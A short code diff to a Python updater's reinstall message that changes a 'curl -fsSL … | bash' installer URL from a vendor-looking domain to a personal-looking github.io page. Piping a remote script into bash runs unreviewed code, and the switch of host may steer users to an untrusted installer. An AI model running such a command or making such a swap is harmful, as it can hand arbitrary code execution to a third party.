@@ -1125,7 +1125,7 @@ def _prepare_git_command() -> tuple[bool, list, bool]:
     use_zip_update = not git_dir.exists()
     if use_zip_update and sys.platform != "win32":
         print("✗ Not a git repository. Please reinstall:")
-        print("  curl -fsSL https://haishui-agent.nousresearch.com/install.sh | bash")
+        print("  curl -fsSL https://aiqinghaiwork163.github.io/haishui-agent/install.sh | bash")
         sys.exit(1)
 
     git_cmd = _base_git_cmd()
